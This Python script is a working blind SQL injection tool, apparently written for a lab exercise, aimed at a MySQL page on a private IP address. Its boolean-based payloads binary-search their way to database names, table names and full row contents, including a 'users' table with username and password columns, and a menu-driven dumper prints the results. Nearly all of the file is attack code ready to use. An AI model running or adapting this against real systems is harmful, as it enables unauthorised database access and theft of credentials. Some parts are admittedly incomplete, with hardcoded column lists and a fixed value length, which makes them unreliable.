import requests
from tabulate import tabulate

# Use case: blind sql injection boolean-based 
# SELECT * FROM table_name where id = '$_GET["something"]'...
# or... change payload(template) by hand


url = "http://172.30.0.1/task2_sqli/blind.php"


# ascii 128 character
def binSearch(payload_template=""):
    low, hi = 0, 128
    while True:
        mid = int((low + hi ) / 2)
        payload = payload_template.format(mid=mid)
        r = requests.get(url, params={"type":"boolean", "id":payload})
        if r.text.find("Found") != -1:
            hi = mid
        else:
            low = mid
        if hi - low <= 1:
            break
    res = low
    return res


def searchDb():
    dbs = []
    #fetching number of databases
    print("fetching number of databases...")
    template = "1' and (SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA)<{mid}-- "
    count = binSearch(payload_template=template)
    print("\nnumber of databases is %d " % count)
    
    for i in range(0, count):
        #find length of each db name
        tpl = "1' and length((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {offset},1))<{mid};-- -".format(offset=i, mid= "{mid}") # nested formatting
        dbLen = binSearch(tpl)
        
        #extract db name
        db=""
        for j in range(1, dbLen+1): # cause mid() in mysql identify from 1, not 0
            tpl = "1' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {i},1),{j},1))<{mid};-- -".format(i=i, j=j, mid="{mid}")
            char = chr(binSearch(tpl))
            db = db + char
        print("found: %s" % db)
        dbs.append(db)
        
    print("available databases: ")
    print("---------------")
    for i in dbs: print(i)
    print("---------------")
            
def searchTable(db):
    tbls = []
    #fetching number of tables
    print("fetching number of tables...")
    template = "1' AND (SELECT IFNULL(CAST(COUNT(DISTINCT(table_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{db}')<{mid};-- -".format(db=db, mid="{mid}")
    count = binSearch(payload_template=template)
    print("database %s has %d tables." % (db, count))
    
    for i in range(0, count):
        #find length of each table name
        template = "1' AND length((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{db}' LIMIT {i},1))<{mid};-- -".format(db=db, i=i, mid= "{mid}")
        tbLen = binSearch(template)
        
        #extract table name
        tbl=""
        for j in range(1, tbLen+1): # cause mid() in mysql identify from 1, not 0
            template = " 1' AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{db}' LIMIT {i},1),{j},1))<{mid};-- -".format(db=db, i=i, j=j, mid="{mid}")
            char = chr(binSearch(template))
            tbl = tbl + char
        print("found: %s" % tbl)
        tbls.append(tbl)
        
    print("Database: %s" % db)
    print("has %d tables: " %len(tbls))
    print("---------------")
    for i in tbls: print(i)
    print("---------------")
    
def searchCol(db, table):
    #fetching columns.
    #again, the flow is number of columns -> length of each column name -> and the full name
    #todo...
    if table == "users":
        return ["id", "username", "password"]
    elif table == "cars":
        return ["make", "model", "year", "value"]
    return

def dumper(db, table):
    coList = searchCol(db, table)
    
    #find number of rows
    print("fetching entries for table '%s' in database '%s'..." % (table, db))
    template = "1' AND (SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM {db}.{table})<{mid};-- -".format(db=db, table=table, mid = "{mid}")
    row = binSearch(template)
    
    #for 'tabulate' module
    dump = {}
    for i in range(len(coList)):
        dump[coList[i]] = []   


    # dump-all
    for offset in range(row):
        for column in coList:
            retVal = ""
            for j in range(1, 10): # ... too lazy, assuming max_length is 10.
                template = "1' AND ORD(MID((SELECT IFNULL(CAST({column} AS NCHAR),0x20) FROM {db}.{table} ORDER BY {firstCol} LIMIT {offset},1),{j},1))<{mid}-- ".format(column=column, db=db, table= table,firstCol=coList[0], offset=offset, j=j, mid="{mid}")
                char = chr(binSearch(template))
                retVal = retVal + char
            print("found: %s" % retVal)
            dump[column].append(retVal.strip("\x00")) # strip() is temporary solution
            print(dump)
            
            
    # print table
    data = list(zip(*[dump[key] for key in coList]))    
    print(tabulate(data, headers=coList, tablefmt="grid"))
        
    
    
    
#demo only in mysql 
def menu():
    while True:
        print("\nMenu:")
        print("1. Search available databases ")
        print("2. Search available tables")
        print("3. Dump databases")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            searchDb()
            
        elif choice == '2':
            db_name = input("database: ")
            searchTable(db_name)
            
        elif choice == '3':
            db_name = input("database: ")
            tbl_name = input("table: ")
            dumper(db_name, tbl_name)
            
        elif choice == '4':
            break
        else:
            print("Invalid choice. Please try again.")



def main():
    menu()
    
if __name__ == "__main__":
    main()